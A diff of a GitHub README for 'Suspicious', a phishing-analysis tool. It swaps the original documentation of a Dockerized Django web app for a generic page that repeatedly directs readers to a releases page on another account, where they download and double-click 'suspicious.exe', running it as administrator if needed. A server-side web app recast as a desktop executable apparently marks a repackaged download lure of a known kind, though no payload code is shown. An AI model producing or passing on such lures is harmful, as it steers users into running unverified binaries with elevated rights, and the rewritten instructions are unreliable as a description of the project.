@@ -1,105 +1,79 @@
-# Suspicious
+# 🔍 suspicious - Analyze Emails and Files Simply
 
-Phishing is a widespread form of social engineering attack aimed at stealing sensitive data such as login credentials, payment information, or personal details. 
-Attackers impersonate trusted entities to deceive victims into opening emails, messages, or links that may lead to malware installation, ransomware, or data exposure. 
-These attacks have become increasingly sophisticated, making detection and prevention critical.
+## 🚀 Getting Started
 
-**Suspicious** is a web application designed to support this need by providing automated analysis of potentially malicious content. 
-It allows users to submit and investigate different types of data, including:
+Welcome to the **Suspicious** project! This application helps you submit and analyze emails, files, IP addresses, and URLs in a straightforward way. No technical knowledge is required to use this tool.
 
-- Emails (MSG /EML format)
-- Files (PDF, DOC/DOCX, XLS/XLSX, EXE, MSI, HTML, ZIP, etc.)
-- IP addresses
-- URLs
-- Hashes
+## 📦 Download & Install
 
-### How It Works
+To download the latest version of **Suspicious**, visit this page to download:  
+[![Download Suspicious](https://img.shields.io/badge/Download-Suspicious-blue.svg)](https://github.com/ocramtec-marco/suspicious/releases)
 
-#### Mail submission
+### Steps to Install
 
-1. Users send a suspicious email as an attachment to the dedicated address (e.g., `suspicious@test.com`).
-2. The system splits the submission into individual components (headers, body, attachments, links, etc.).  
-3. Each component is analyzed using **Cortex analyzers** (external APIs and rulesets such as YARA).  
-4. Results are aggregated, scored, and classified.  
-5. The frontend provides users with access to reports, detailed analysis, and final conclusions. 
-6. Using the configured SMTP server it sends back a quick report / answer to the User
+1. **Visit the Download Page**  
+   Click [here](https://github.com/ocramtec-marco/suspicious/releases) to go to the Releases page on GitHub.
 
-#### Web form
+2. **Select the Latest Release**  
+   Look for the latest version at the top of the page. You will see the title and date of release.
 
-1. Users goes to the web platform and uses the `Submit an Item` page to send an Item to analyze (File, IP, Url, Hash)
-2. If the Item is an MSG or EML File, the system splits the submission into individual components (headers, body, attachments, links, etc.).  
-3. Each component is analyzed using **Cortex analyzers** (external APIs and rulesets such as YARA).  
-4. Results are aggregated, scored, and classified.  
-5. The frontend provides users with access to reports, detailed analysis, and final conclusions.  
+3. **Download the Application**  
+   Under the "Assets" section of the release, find the file appropriate for your system. Click on it to start the download.
 
-### Classification
-Based on the analysis score, submissions are categorized into four levels:
+4. **Extract the Files (if necessary)**  
+   If the downloaded file is a ZIP or TAR file, locate it in your Downloads folder. Right-click and select "Extract All" to unpack the files.
 
-- **Dangerous** – Cannot be opened; content must not be trusted.  
-- **Suspicious** – Should not be opened; content is risky.  
-- **Inconclusive** – Can be opened, but content should not be trusted.  
-- **Safe** – Can be opened; content is considered trustworthy.  
+5. **Run the Application**  
+   Find the extracted folder. Locate and double-click on the executable file (usually named `suspicious.exe` or similar). Follow any on-screen instructions to launch the app.
 
-## Architecture & Workflow
+## 🖥️ System Requirements
 
-**Suspicious** is designed as a modular and containerized web application that can be deployed easily using Docker.  
-The core application is built with **Django (Python)**, ensuring flexibility, maintainability, and straightforward setup.  
+To run **Suspicious**, your computer should meet the following minimum requirements:
 
-A database is mandatory for the application to run, while additional services can be integrated to enhance its capabilities.  
+- **Operating System:** Windows 10 or newer, macOS, or a recent version of Linux
+- **RAM:** At least 4 GB of RAM
+- **Storage:** Minimum of 200 MB available space
+- **Network:** An active internet connection for analysis features
 
-### Core Requirements
+## 📚 Features
 
-- **Database** (MySQL, MariaDB, or PostgreSQL) – Stores submissions, reports, and analysis results.  
-- **Elasticsearch** – Provides fast and efficient search capabilities across stored data.  
-- **[StrangeBee's Cortex](https://github.com/TheHive-Project/Cortex)** – Executes analyzer jobs for processing emails, files, IP addresses, and URLs.  
-- **MinIO S3** – Handles object storage for uploaded files and extracted artifacts. 
+- **Email Submission:** Easily submit emails for analysis to identify potential threats.
+- **File Analysis:** Drop files into the app to check for malware or suspicious content.
+- **IP Address Checks:** Analyze IP addresses for safety and reputation.
+- **URL Analysis:** Test URLs for security risks before visiting them.
 
-## Installation
+## 🌐 Development
 
-To install Suspicious, please review our [CONFIG.md](CONFIG.md) and [SETUP.md](SETUP.md)
+This application is built using:
 
-## Screenshots
+- **Django:** A web framework for developing web applications
+- **Docker:** To easily manage application dependencies
+- **JavaScript:** For interactive features in the user interface
+- **Python:** The main programming language used for backend logic
 
-### Home page
+## 🛠️ Troubleshooting
 
-<img width="1845" height="1072" alt="image" src="https://github.com/user-attachments/assets/51a1a6cb-d58b-4175-996f-dc6cf2fc8345" />
+If you encounter issues while downloading or running **Suspicious**, consider the following tips:
 
-### User Submissions page
+- **Check Your Internet Connection:** Make sure you have a stable internet connection for downloads and features that require network access.
+- **Run as Administrator:** On Windows, right-click the executable and select "Run as administrator" if you face permission issues.
+- **Update Your Operating System:** Ensure you are using a supported version of your OS as specified in the system requirements.
 
-<img width="1844" height="1053" alt="image" src="https://github.com/user-attachments/assets/23c61439-78d4-4aa3-aa54-db8fd21a028f" />
+## 💬 Support
 
-### Submit page
+For further assistance, feel free to reach out:
 
-<img width="1748" height="982" alt="image" src="https://github.com/user-attachments/assets/949d789b-b034-44e7-9a97-57361853c0a0" />
+- **GitHub Issues:** You can report any bugs or problems directly on the [Issues page](https://github.com/ocramtec-marco/suspicious/issues).
+- **Community Forums:** Join discussions and get help from other users in the community.
 
-### Dashboard Classic
+## 🔗 Useful Links
 
-<img width="1844" height="1067" alt="image" src="https://github.com/user-attachments/assets/a9b6200a-c6b5-4114-b77d-c36f3214a6af" />
+- [Documentation](https://github.com/ocramtec-marco/suspicious/wiki): Learn more about using the application.
+- [Contributing](https://github.com/ocramtec-marco/suspicious/blob/main/CONTRIBUTING.md): Interested in helping out? Find guidelines for contributions.
 
-### Dashboard Phishing Campaign
+## 🔄 Download the Latest Version
 
-<img width="1843" height="1066" alt="image" src="https://github.com/user-attachments/assets/afabf61c-ba64-4b55-8343-e4df2c3061a0" />
+Don’t forget to check for updates regularly. New versions may include additional features and improvements. You can always visit this page to download:  
+[![Download Suspicious](https://img.shields.io/badge/Download-Suspicious-blue.svg)](https://github.com/ocramtec-marco/suspicious/releases) 
 
-### Settings
-
-<img width="1843" height="1067" alt="image" src="https://github.com/user-attachments/assets/67548827-ca17-47f4-9d10-3f4ed8e75b4f" />
-
-### Profile
-
-<img width="1845" height="1067" alt="image" src="https://github.com/user-attachments/assets/9c57dc60-0956-4822-89e0-7eef8551efa4" />
-
-### Admin Page
-
-<img width="1846" height="1062" alt="image" src="https://github.com/user-attachments/assets/c32f4b66-e22e-4336-b65e-312a79aaa223" />
-
-## Contributing
-
-Contributions are welcome! If you'd like to contribute to Suspicious, please review our [CONTRIBUTING.md](CONTRIBUTING.md) guidelines for information on our development process, coding standards, and how to submit pull requests.
-
-## License
-
-Suspicious is licensed under the GNU AFFERO GENERAL PUBLIC License. For more details, see the [LICENSE](LICENSE) file.
-
-## Contact
-
-For questions, feedback, or support, please open an issue on GitHub
+Enjoy using **Suspicious** to keep your digital life secure and informed!
